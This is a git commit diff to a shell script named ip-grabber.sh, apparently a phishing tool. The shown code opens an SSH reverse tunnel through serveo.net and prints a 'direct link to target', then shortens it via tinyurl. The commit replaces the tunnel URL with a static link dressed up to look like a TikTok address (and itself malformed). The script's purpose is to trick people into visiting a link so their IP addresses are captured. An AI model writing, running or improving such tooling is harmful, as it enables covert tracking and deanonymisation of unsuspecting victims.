c8d41fafc387d758ba5673ce9d4cf13f046d1588
anzarsw-ui <anzarsw@gmail.com>
2025-12-07 21:56:52 +0100

    Update send_link to a static TikTok URL
    Changed the send_link variable to a static URL instead of extracting from sendlink.

--- ip-grabber.sh
+++ ip-grabber.sh
@@ -164,7 +164,7 @@ fi
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
 printf "\n"
 sleep 10
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+send_link="https://tiktok-oliviacreuset/"
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
 send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
